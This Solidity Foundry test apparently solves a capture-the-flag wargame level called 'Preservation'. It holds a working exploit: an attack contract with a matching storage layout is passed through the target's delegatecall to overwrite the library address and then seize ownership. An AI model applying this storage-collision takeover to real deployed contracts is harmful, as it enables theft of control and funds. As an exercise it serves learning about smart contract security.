//SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "../Preservation.sol";

contract PreservationTest is Test {
    LibraryContract timeZone1Library;
    LibraryContract timeZone2Library;

    Preservation preservation;
    address attacker = makeAddr("attacker");

    function setUp() public {
        timeZone1Library = new LibraryContract();
        timeZone2Library = new LibraryContract();
        preservation = new Preservation(address(timeZone1Library), address(timeZone2Library));
    }
    function test_Challenge16_Passed() public {
        AttackContract attackCon = new AttackContract();
        preservation.setFirstTime(uint256(uint160(address(attackCon))));
        preservation.setFirstTime(uint256(uint160(attacker)));

        address owner = preservation.owner();
        assertEq(owner, attacker);
    }
}

contract AttackContract {
    uint256 x;
    uint256 y;
    address attacker;

    function setTime(uint256 _attackerAddress) external {
        attacker = address(uint160(_attackerAddress));
    }
}